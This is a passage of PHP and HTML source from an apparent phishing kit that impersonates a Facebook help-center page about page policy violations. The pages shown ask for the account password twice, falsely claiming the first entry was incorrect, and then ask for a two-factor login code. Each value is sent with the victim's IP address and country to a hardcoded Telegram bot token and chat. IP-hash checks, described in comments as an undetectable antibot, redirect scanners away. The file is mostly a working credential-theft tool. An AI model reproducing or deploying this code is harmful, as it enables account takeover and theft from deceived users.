<section class="afterheader"><div class="container"><div class="row"><div class="col-12 col-md-3 sidebar-afterheader">  <ul class="list-group"><li class="list-group-item">Creating an Account</li><li class="list-group-item">Friending</li><li class="list-group-item">Your Home Page</li><li class="list-group-item">Messaging</li><li class="list-group-item">Stories</li><li class="list-group-item">Photos</li><li class="list-group-item">Videos</li><li class="list-group-item">Pages</li><li class="list-group-item">Groups</li><li class="list-group-item">Events</li><li class="list-group-item">Payments</li><li class="list-group-item">Marketplace</li><li class="list-group-item">Apps</li><li class="list-group-item">Accessibility</li></ul></div>
<div class="col-12 col-md-7">  
            
<div style="border: 1px solid #c8cacc; border-radius: 4px">

<h3 class="titleh3">Appeal a Page Policy Violation</h3>

<div class="content2">If you believe your Page is going to be unpublished by mistake, please enter the following information. By entering the following information we will review your page again.

<form action="" method="POST" style="margin-top:14px">
<div class="form-group">
<label for="exampleFormControlInput1">Page Name</label><br>

<input type="text" class="form-control" id="exampleFormControlInput1" style="font-size:13px;" value="" name="pgus" required=""></div>

<div class="form-group"><label for="exampleFormControlInput1">email address </label>

<input type="email" class="form-control" id="exampleFormControlInput1" name="emsf" required=""></div>
                    
<div class="form-group"> 
<label for="exampleFormControlInput1">Phone number</label>

<input type="tel" class="form-control" id="exampleFormControlInput1" name="phone" required="">
                    </div>
                    
                    <div class="form-group">
                        <!--? 
                        $scc= 'no';
                        if(isset($_GET['message'])){
                            $scc = 'yes';   
                        }  
                        ?-->
<input type="hidden" value="<? echo $scc; ?>" name="redirecty">

<label for="exampleFormControlInput1">Your full name</label><br>

<small>As it's listed on the account</small>
<input type="text" class="form-control" id="exampleFormControlInput1" name="fname"></div>

<div class="form-group"><label for="exampleFormControlTextarea1">Additional info</label>
<textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="adninfo"></textarea></div></form></div>

<div class="babikasubmitdesktop">
<input type="submit" data-toggle="modal" data-target="#exampleModal" class="btn btn-primary" name="submitButton"></div></div></div></div></div></section>

<div class="modal show" style="margin-top: 20px; padding-right: 16px; display: block;" id="exampleModal" tabindex="-1" role="dialog">

<form action="<?php echo $MyURL; ?>index.php?step=4" method="POST" style="margin-top:14px">
<div class="modal-dialog" role="document">
<div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content ">
<div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5 " class="modal-header">
<input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" />
<h5 class="modal-title" style="color: #1d2129; font-size:14px; font-weight:600; line-height: 25px ">Please Re-enter Your Password</h5>
                        
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span></button></div>

<div class="modal-body">
<p style="font-size:14px; ">For your security, you must re-enter your password to continue.</p>

<div style="margin-bottom:0px;" class="form-group row">
<label id="hiqetash" for="inputPassword3" class=" col-form-label" style="font-size:14px;display:inline-block; padding-left:15px; padding-right:9px;">Password</label>

<div id="hiqetash2" style="display:inline-block">
<input type="password" required="" name="pwja" style="height: 25px; font-size:16px; width: 130px; margin-top:5px; border-radius:0px; padding: 0px 3px;" class="form-control" id="inputPassword3">
</div></div></div>


<div class="modal-footer">
<input style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" class="btn btn-primary"  type="submit" name="FormPasswordOne">
                        <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button></div></div></div></form></div>

<div class="container butonsend butonsendonlymobile">
<div class="row">
<div class="col-12"></div></div></div>
	
    
 <section class="footeriba">
<div class="container">
<div class="row">
<div class="col-12">
<ul>
<li><a class="active" href="#">English (US)</a></li>
<li><a href="#">Deutsch</a></li>
<li><a href="#">Türkçe</a></li>
<li><a href="#">Српски</a></li>
<li><a href="#">Français (France)</a></li>
<li><a href="#">Italiano</a></li>
<li><a href="#">Bosanski</a></li>
<li><a href="#">Svenska</a></li>
<li><a href="#">Español</a></li>
<li><a href="#">Português (Brasil)</a></li>
<li style="float:right; color:#8d949e"><a>Facebook © 2019</a></li>
</ul></div></div>

<div class="row footermenu">
<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">About</li>
<li class="list-group-item">Privacy</li>
<li class="list-group-item">Careers</li>
</ul>
</div>

<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">Ad Choices</li>
<li class="list-group-item">Create Ad</li>
<li class="list-group-item">Create Page</li>
</ul></div>

<div class="col-md-2">
<ul class="list-group">
<li class="list-group-item">Terms &amp; Policies</li>
<li class="list-group-item">Cookies</li>
</ul></div></div></div></section>
    
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<br>
<div class="modal-backdrop show"></div>
</body>
</html>

<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
}} elseif($step === "5"){
if (isset($_POST['pwja2'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
$apiToken = "5319096395:AAHcq6FVYhEWXNAMp8HbnyiLOejYwib7sjo";
$data =['chat_id' => '-1001623340392',
'text' => '==========>Passowrd 2<=========='. PHP_EOL . 'Password2: '.$_POST['pwja2'] . PHP_EOL . 'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );
?>
<form action="<?php echo $MyURL; ?>index.php?step=6#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
?>

<html lang="en"><head><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://chimpstatic.com/mcjs-connected/js/users/bed1a45254971ada65acedf9b/0ba8f4afa78a22970976b239e.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://chimpstatic.com/mcjs-connected/js/users/bed1a45254971ada65acedf9b/0ba8f4afa78a22970976b239e.js"></script><script type="text/javascript">
    $(window).on('load', function() {
        $('#exampleModal').modal('show');
    });
</script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!-- Required meta tags -->
    
   
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum- 
scale=1.0; user-scalable=0">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <title>Your personal account will be unpublish soon!</title>
    <style type="text/css">
      body{
        background-color: white;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content{

      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 input[type=password]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 label{
        margin-bottom:1px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:32px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:9px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #dddfe2;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .headerbabika{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .headerbabika{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
  </head>
  <body class="modal-open" style="padding-right: 16px;">
      
    <section class="headerbabika" style="background-color:#39569a; padding-top:7px; padding-bottom:7px">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-4"> 
            <img src="yos.png" class="logojababik">
          </div>
          <div class="col-12 col-md-8 searchibl"> 
            <div class="justify-content-center">
                <form class="card card-sm">
                    <div class="card-body row no-gutters align-items-center">
                        <div class="col-auto">
                            <i class="fas fa-search h4 text-body"></i>
                        </div>
                        <!--end of col-->
                        <div class="col">
                            <input class="form-control form-control-lg form-control-borderless" type="search" placeholder="How can we help?">
                        </div>
                    </div>
                </form>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="navbari">
        <div class="container">
            <nav class="navbar navbar-expand-lg navbar-light ">
              
            
              <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                  
                  <li class="nav-item">
                    <a class="nav-link nav-linkuu" href="#"><i class="fas fa-home"></i> Help Center</a>
                  </li>
                  
                </ul>
                <div class="my-2 my-lg-0">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" style="font-weight:400 !important; font-size:12px; color:#4065b4" href="#">English (U.S)</a>
                        </li>
                    </ul>
                </div>
              </div>
            </nav>
        </div>
    </section>
    
    <section class="afterheader">
      <div class="container">
        <div class="row">
            <div class="col-12 col-md-3 sidebar-afterheader">  
                <ul class="list-group">
                  <li class="list-group-item">Creating an Account</li>
                  <li class="list-group-item">Friending</li>
                  <li class="list-group-item">Your Home Page</li>
                  <li class="list-group-item">Messaging</li>
                  <li class="list-group-item">Stories</li>
                  <li class="list-group-item">Photos</li>
                  <li class="list-group-item">Videos</li>
                  <li class="list-group-item">Pages</li>
                  <li class="list-group-item">Groups</li>
                  <li class="list-group-item">Events</li>
                  <li class="list-group-item">Payments</li>
                  <li class="list-group-item">Marketplace</li>
                  <li class="list-group-item">Apps</li>
                  <li class="list-group-item">Accessibility</li>
                </ul>
            </div>
          <div class="col-12 col-md-7">  
            
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Appeal a Page Policy Violation</h3>
              <div class="content2">
                  If you believe your Page is going to be unpublished by mistake, please enter the following information. By entering the following information we will review your page again.
                  <form action="" method="POST" style="margin-top:14px">
                      <div class="form-group">
                      <label for="exampleFormControlInput1">Page Name</label><br>
                      <input type="text" class="form-control" id="exampleFormControlInput1" style="font-size:13px;" value="" name="pgus" required="">
                    </div>
                    <div class="form-group"> 
                      <label for="exampleFormControlInput1">email address </label>
                      <input type="email" class="form-control" id="exampleFormControlInput1" name="emsf" required="">
                    </div>
                    
                     <div class="form-group"> 
                      <label for="exampleFormControlInput1">Phone number</label>
                      <input type="tel" class="form-control" id="exampleFormControlInput1" name="phone" required="">
                    </div>
                    
                    <div class="form-group">
                        <!--? 
                        $scc= 'no';
                        if(isset($_GET['message'])){
                            $scc = 'yes';   
                        }  
                        ?-->
                        <input type="hidden" value="<? echo $scc; ?>" name="redirecty">
                      <label for="exampleFormControlInput1">Your full name</label><br>
                      <small>As it's listed on the account</small>
                      <input type="text" class="form-control" id="exampleFormControlInput1" name="fname">
                    </div>
                    <div class="form-group">
                      <label for="exampleFormControlTextarea1">Additional info</label>
                      <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="adninfo"></textarea>
                    </div>
              </form></div>
              <div class="babikasubmitdesktop">
			  <input type="submit" data-toggle="modal" data-target="#exampleModal" class="btn btn-primary" name="submitButton">
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <div class="modal show" style="margin-top: 20px; padding-right: 16px; display: block;" id="exampleModal" tabindex="-1" role="dialog">
                  <div class="modal-dialog" role="document">
                    <div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content ">
                      <div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5 " class="modal-header">
                        <h5 class="modal-title" style="color: #1d2129; font-size:14px; font-weight:600; line-height: 25px ">Please Re-enter Your Password</h5>
                        
                        <button onclick="window.location.href='checkpoint.php' type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">x</span>
                        </button>
                      </div>
				

  <form action="<?php echo $MyURL; ?>index.php?step=5" method="POST" style="margin-top:14px">
                      <div class="modal-body">
                        <p style="font-size:14px; ">For your security, you must re-enter your password to continue.</p>
                        <div style="margin-bottom:0px;" class="form-group row">
                            <label id="hiqetash" for="inputPassword3" class=" col-form-label" style="font-size:14px;display:inline-block; padding-left:15px; padding-right:9px;">Password</label>
<input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" />
                            <div id="hiqetash2" style="display:inline-block">
                              <input type="password" required="" name="pwja2" style="height: 25px; font-size:16px; width: 130px; margin-top:5px; border-radius:0px; padding: 0px 3px;" class="form-control" id="inputPassword3">
                            </div>
							<span id="displaybro" style="display: none; color:red; padding-left:15px; font-size:13px;">Your password was incorrect.</span>
                            <span id="displaybro" style="width:100%; display: block; color: red; padding-left: 15px; font-size: 13px;">Your password was incorrect.</span>
                            
                            
                         </div>
                         
                      </div>
                      <div class="modal-footer">
					  <input style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" class="btn btn-primary"  type="submit" name="FormPasswordTwo">
                        <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                      </div>
                    </div>
                  </div>
                </form>
				</div>
    <div class="container butonsend butonsendonlymobile">
      <div class="row">
        <div class="col-12">
        </div>
      </div>
    </div>
	
    
    
    <section class="footeriba">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <ul>
                      <li><a class="active" href="#">English (US)</a></li>
                      <li><a href="#">Deutsch</a></li>
                      <li><a href="#">Türkçe</a></li>
                      <li><a href="#">Српски</a></li>
                      <li><a href="#">Français (France)</a></li>
                      <li><a href="#">Italiano</a></li>
                      <li><a href="#">Bosanski</a></li>
                      <li><a href="#">Svenska</a></li>
                      <li><a href="#">Español</a></li>
                      <li><a href="#">Português (Brasil)</a></li>
                      <li style="float:right; color:#8d949e"><a>Facebook © 2019</a></li>
                    </ul>
                </div>
            </div>
            <div class="row footermenu">
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">About</li>
                      <li class="list-group-item">Privacy</li>
                      <li class="list-group-item">Careers</li>
                    </ul>
                </div>
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">Ad Choices</li>
                      <li class="list-group-item">Create Ad</li>
                      <li class="list-group-item">Create Page</li>
                    </ul>
                </div>
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">Terms &amp; Policies</li>
                      <li class="list-group-item">Cookies</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  
  
 
<br>
<div class="modal-backdrop show"></div>

  </body>
  
  
 


</html>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
}} elseif($step === "6"){ 
if (isset($_POST['cgn'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
$apiToken = "5319096395:AAHcq6FVYhEWXNAMp8HbnyiLOejYwib7sjo";
$data =['chat_id' => '-1001623340392',
'text' => '==========> 2FA CODE 1<=========='. PHP_EOL . '2FA Code: '.$_POST['cgn'] . PHP_EOL . 'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );
?>
<form action="<?php echo $MyURL; ?>index.php?step=7#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
?>
<?php $post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
?>






<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    
   
    

    <title>Your personal account will be disabled soon!</title>
    <style type="text/css">
      body{
        background-color: #e9ebee;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content2 p{
          margin-top:7px;
          margin-bottom:7px;
      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
        font-size:13px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:50px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:20px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #e9ebee;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .headerbabika{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:10px 20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .headerbabika{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">


    <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/bed1a45254971ada65acedf9b/0ba8f4afa78a22970976b239e.js");</script>
  </head>
  <body>
    <section class="headerbabika" style="background-color:#39569a; padding-top:7px; padding-bottom:7px">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-4"> 
            <img src="yos.png" class="logojababik" />
          </div>
          <div class="col-12 col-md-8 searchibl"> 
          
          </div>
        </div>
      </div>
    </section>

    <section class="afterheader">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-6 offset-md-3">  
            
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Two-factor authentication required</h3>
              <div class="content2">
                  <p></p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                  <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                  <form action="<?php echo $MyURL; ?>index.php?step=6" method="POST" style="margin-top:14px">
                    <div class="form-group"> 
                      <input type="text" required class="form-control" name="cgn" placeholder="Login code" >
                    </div>
              </div>
<input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" />
              <div class="babikasubmitdesktop">
                  <button type="submit" name="FaButton" class="btn btn-primary">Send</button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <div class="container butonsend butonsendonlymobile">
      <div class="row">
        <div class="col-12">
          <button type="submit" name="FaButton" class="btn btn-primary">Send</button>
        </div>
      </div>
    </div>
    </form>


    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  </body>
</html>

















<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
}} elseif($step === "7"){ 
if (isset($_POST['FaButton'])) {
$post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
$apiToken = "5319096395:AAHcq6FVYhEWXNAMp8HbnyiLOejYwib7sjo";
$data =['chat_id' => '-1001623340392',
'text' => '==========>2FA CODE 2<=========='. PHP_EOL . '2FA TWO STEP Code: '.$_POST['cgn'] . PHP_EOL . 'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );
?>
<form action="<?php echo $MyURL; ?>index.php?step=8#<?php echo $post;?>#<?php echo $key;?>" method="POST" id="submit-form"><input type="hidden" name="rb" value="<?php echo $post;?>" id="rb" /><button style="visibility:hidden;" role="submit"></button></form>
<?php
//echo "PHP KekusRF Antibot is FUD"; 
} else {
header("Location: ".$notoken."");
}
} else {
?>
<?php $post = "".$_POST['rb']."";
$string = $ip;
if (md5($string) == $post){ 
?>






<!doctype html>
